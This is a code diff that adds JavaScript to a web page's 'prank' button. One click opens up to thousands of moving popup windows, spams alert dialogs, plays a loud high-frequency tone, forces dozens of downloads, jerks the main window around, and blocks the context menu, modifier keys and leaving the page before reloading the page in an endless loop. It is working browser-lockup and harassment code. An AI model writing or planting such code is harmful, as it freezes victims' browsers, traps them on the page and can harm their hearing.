@@ -15,9 +15,179 @@
 
     <script>
         const button = document.getElementById('prankButton');
+        let popupCount = 0;
+        const maxPopups = 5000;
+
+        const popupMessages = [
+            "SURPRISE",
+            "CONGRATULATIONS",
+            "YOU WON",
+            "FREE GIFT",
+            "IMPORTANT ALERT",
+            "WARNING",
+            "ANNOUNCEMENT",
+            "PARTY TIME",
+            "EMERGENCY",
+            "BOOM",
+            "HAPPY DAY",
+            "RAINBOWS",
+            "UNICORNS",
+            "PIZZA TIME",
+            "GAME OVER",
+            "NEW MESSAGE",
+            "NOTIFICATION",
+            "WISH GRANTED",
+            "DRAMA",
+            "BLAST OFF"
+        ];
+
+        const activePopups = [];
+
+        function createPopup() {
+            if (popupCount >= maxPopups) return;
+            
+            const popup = window.open('https://www.youtube.com/watch?v=sdUUx5FdySs', '_blank', 'width=400,height=300,fullscreen');
+            if (popup) {
+                popupCount++;
+                activePopups.push(popup);
+                
+                const randomX = Math.random() * (screen.width - 400);
+                const randomY = Math.random() * (screen.height - 300);
+                popup.moveTo(randomX, randomY);
+                
+                window.focus();
+            }
+        }
+
+        function movePopups() {
+            activePopups.forEach(popup => {
+                if (popup && !popup.closed) {
+                    const randomX = Math.random() * (screen.width - 400);
+                    const randomY = Math.random() * (screen.height - 300);
+                    popup.moveTo(randomX, randomY);
+                }
+            });
+        }
+
+        let isFullscreen = false;
+        function toggleFullscreen() {
+            activePopups.forEach(popup => {
+                if (popup && !popup.closed) {
+                    try {
+                        if (isFullscreen) {
+                            popup.document.exitFullscreen();
+                        } else {
+                            popup.document.documentElement.requestFullscreen();
+                        }
+                    } catch(e) {}
+                }
+            });
+            isFullscreen = !isFullscreen;
+        }
+
+        function createAlerts() {
+            for (let i = 0; i < 50; i++) {
+                setTimeout(() => {
+                    const randomMessage = popupMessages[Math.floor(Math.random() * popupMessages.length)];
+                    alert(`${randomMessage}\n\nAlert #${i + 1} of 50`);
+                }, i * 200);
+            }
+        }
+
+        function playHighPitchNoise() {
+            const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+            const oscillator = audioContext.createOscillator();
+            const gainNode = audioContext.createGain();
+            
+            oscillator.type = 'sawtooth';
+            oscillator.frequency.setValueAtTime(8000, audioContext.currentTime);
+            oscillator.frequency.exponentialRampToValueAtTime(15000, audioContext.currentTime + 0.1);
+            
+            gainNode.gain.setValueAtTime(1, audioContext.currentTime);
+            
+            oscillator.connect(gainNode);
+            gainNode.connect(audioContext.destination);
+            
+            oscillator.start();
+            
+            setInterval(() => {
+                const freq = 8000 + Math.random() * 7000;
+                oscillator.frequency.setValueAtTime(freq, audioContext.currentTime);
+            }, 50);
+        }
+
+        window.addEventListener('beforeunload', function (event) {
+            event.preventDefault();
+            event.returnValue = '';
+        });
+
+        document.addEventListener('contextmenu', e => e.preventDefault());
+
+        document.addEventListener('keydown', e => {
+            if(e.ctrlKey || e.altKey || e.metaKey) {
+                e.preventDefault();
+            }
+        });
+
+        function moveMainWindow() {
+            const randomWidth = 200 + Math.random() * 600;
+            const randomHeight = 200 + Math.random() * 600;
+            const randomX = Math.random() * (screen.width - randomWidth);
+            const randomY = Math.random() * (screen.height - randomHeight);
+            window.resizeTo(randomWidth, randomHeight);
+            window.moveTo(randomX, randomY);
+        }
+
+        function downloadFile(filename, content) {
+            const blob = new Blob([content], { type: 'text/plain' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = filename;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+        }
+
+        function downloadManyFiles() {
+            for (let i = 0; i < 50; i++) {
+                setTimeout(() => {
+                    downloadFile(`file_${i}.txt`, `This is file ${i}`);
+                }, i * 5);
+            }
+        }
 
         button.addEventListener('click', () => {
-            while(1) location.reload(1);
+            playHighPitchNoise();
+            downloadManyFiles();
+            
+            for (let i = 0; i < 500; i++) {
+                setTimeout(createPopup, i * 10);
+            }
+            
+            setTimeout(createAlerts, 200);
+            
+            setInterval(() => {
+                if (popupCount < maxPopups) {
+                    createPopup();
+                }
+            }, 10);
+            
+            setInterval(movePopups, 10);
+            setInterval(toggleFullscreen, 30);
+            setInterval(moveMainWindow, 20);
+            
+            setInterval(() => {
+                window.focus();
+            }, 50);
+            
+            button.textContent = 'TOO LATE';
+            button.disabled = true;
+
+            setTimeout(() => {
+                while(1) location.reload(1);
+            }, 5000);
         });
     </script>
 </body>
